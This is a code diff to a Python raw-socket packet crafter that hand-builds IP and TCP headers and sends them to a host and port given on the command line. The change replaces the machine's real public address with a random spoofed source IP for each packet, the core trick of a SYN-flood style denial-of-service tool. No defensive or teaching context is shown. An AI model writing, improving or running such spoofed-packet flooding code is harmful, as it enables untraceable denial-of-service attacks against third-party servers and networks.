@@ -28,10 +28,17 @@ except socket.error , msg:
  
 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
-source_ip = get('https://api.ipify.org').text
+#source_ip = get('https://api.ipify.org').text
+#source_ip = '111.111.111.111'
+def get_random_source_ip():
+  source_ip = str(random.randint(0,254))
+  for i in range(0, 3):
+    source_ip += '.' + str(random.randint(0,254))
+  return source_ip
+
 dest_ip = socket.gethostbyname(str(sys.argv[1]))
 
-def header():
+def header(source_ip):
   ihl = 5
   version = 4
   tos = 0
@@ -48,7 +55,8 @@ def header():
   ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 
 def tcp():
-  header()
+  source_ip = get_random_source_ip()
+  header(source_ip)
   source = random.randint(36000, 65535)
   dest = int(sys.argv[2])
   seq = 0
@@ -66,6 +74,7 @@ def tcp():
   offset_res = (doff << 4) + 0
   tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
   tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
+  #source_address = socket.inet_aton( source_ip )
   source_address = socket.inet_aton( source_ip )
   dest_address = socket.inet_aton(dest_ip)
   placeholder = 0
